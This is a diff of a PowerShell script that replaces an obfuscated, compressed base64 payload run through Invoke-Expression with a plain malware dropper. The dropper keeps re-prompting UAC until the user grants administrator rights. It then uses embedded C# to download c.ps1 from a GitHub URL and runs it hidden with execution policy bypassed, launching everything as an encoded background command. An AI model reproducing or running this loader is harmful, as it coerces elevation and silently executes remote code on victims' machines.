@@ -1,1 +1,58 @@
- ( new-ObjECt  sysTEm.iO.stReamREaDeR((new-ObjECt IO.COmPRESSIoN.DEflatesTrEAM( [SySTem.IO.mEmOrysTreAm][cOnveRT]::froMBaSE64strIng( 'rVVdb9s2FH3Xr7hg8iCjlZwO3R5iFK3jpJvRzjMqp8WQBSgtXltEKFIgqThCkf/eS0m2Yzft0/RgSeT9OofnyCfwvta5l0aDN5AXmN+BXIHLraw8SAe21lrqNXAHY1FKLZ233BsbrbZ5C3Q+affgWwR0WfS11RDfZJjXVvomnVupc1lxlX6RWpiN2y3cwi+ipgK1p53b8/M/0U9qa+k9HgzSqZvqT0Zh3PYL1y+qXNRS+S7+FtgBCNbmD6LHKDqBD4gVVNaUlQ+Ar8cTqKm9gtqhhVzJ/M4B+xcdi4ihONHGQ7wHPxj08IXpH8KVeW59kqlQO/lbKiUd5kYLB7+fne2ivG2e5Ozz5tbk6BxUZoPWFagUJGO7rkvi4SOBAJbMDAWtpEJIrh6Ig3Akc0PDNnDRVJySk/dh9ys7nWcTU5Zcizn3xVfGIPmMdgmfaj2mqI6tzDcU/JcURD1VtNbYcXfMmTfVwYhXD9LvFh4h5z4vjlCcwHXgjkhd8qVqOhJRAJsZBm9BGVMBsUF81+j2taKu4qYIgz9DdLuPoX17cDOzAamdFAio8J576uCItjD12yBgKDo8kxNquZZ5dNrr+00/71iIZNFUxGH4vcQVSaQF/Y5FtQtqyBrnsRwdvKUz9Ecr03+OFi4lX2vjvMzdKIqqekkMEA3hXDJCp/2l2WhluEAbdbP0Mc5zSoJ7IwVsY8Za0GHFHf490yTm0LG2igCxwvvKnQ+Hlm/StfRFvQz6DSxTtzQ35XBDI6E9e/Vb/zS0uHLDArlww5JLPczTyr1io+MGhKcK0qEu4ZaSmpZSY9y+kEEX/X48eAmsqzEg0NsqHS/xF1xOlKRZghrC7Q1o3MBuOe7P9xBjuLr4dMtGkHVMoF/uBhuMnmho99ibqHXUVK8MVE72TY+34icVKCoNLWa8xMDr3oMpPiA7DNya0oXInxrxOYu15vyPzPhiz+8LYLRy2GFikYQ9M10NauNtjYch5LUszNe1D0OvuHI4+oGKtAUcU06P95GMxN51cTfHuqSv7w8CbH13pXNDnqMPSmsy1+aRy+mPYMnzu7U1tRbRKbZhgsa5mRh9j9ZTxYW54A7/eJ210opvFvjg07YgvdL+tZYhK8jqovHo4t6y6cL0KQPSyf/5lezQiP4TCdux2XPHFn0H'),[systEM.iO.CoMPrESsion.COMpResSioNmode]::DeComPReSS)) ,[text.encodinG]::aScII)).reAdToeND() |& ( $VerbOSEPREFEREnCE.tOSTring()[1,3]+'X'-JOIN'')
+# Function to check if script is running as Administrator
+function Test-Admin {
+    return ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
+        [Security.Principal.WindowsBuiltInRole] "Administrator"
+    )
+}
+
+# Keep prompting UAC until user clicks "Yes"
+if (-not (Test-Admin)) {
+    do {
+        Start-Sleep -Milliseconds 500
+        try {
+            Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden -ErrorAction Stop
+            Exit
+        } catch {
+            # User probably clicked "No" — loop continues
+        }
+    } while (-not (Test-Admin))
+    exit
+}
+
+# Now inside elevated session — run hidden C# logic
+$script = {
+    Add-Type -TypeDefinition @"
+using System;
+using System.Net;
+using System.IO;
+using System.Diagnostics;
+
+public class SilentDownloader
+{
+    public static void DownloadAndRun()
+    {
+        string url = "https://raw.githubusercontent.com/wagner012/wagner/refs/heads/main/c.ps1";
+        string tempPath = Path.Combine(Path.GetTempPath(), "c.ps1");
+
+        using (WebClient client = new WebClient())
+        {
+            client.DownloadFile(url, tempPath);
+        }
+
+        ProcessStartInfo psi = new ProcessStartInfo();
+        psi.FileName = "powershell.exe";
+        psi.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + tempPath + "\"";
+        psi.CreateNoWindow = true;
+        psi.UseShellExecute = false;
+
+        Process.Start(psi);
+    }
+}
+"@
+
+    [SilentDownloader]::DownloadAndRun()
+}
+
+# Encode and run silently in background
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script.ToString()))
+Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded" -WindowStyle Hidden
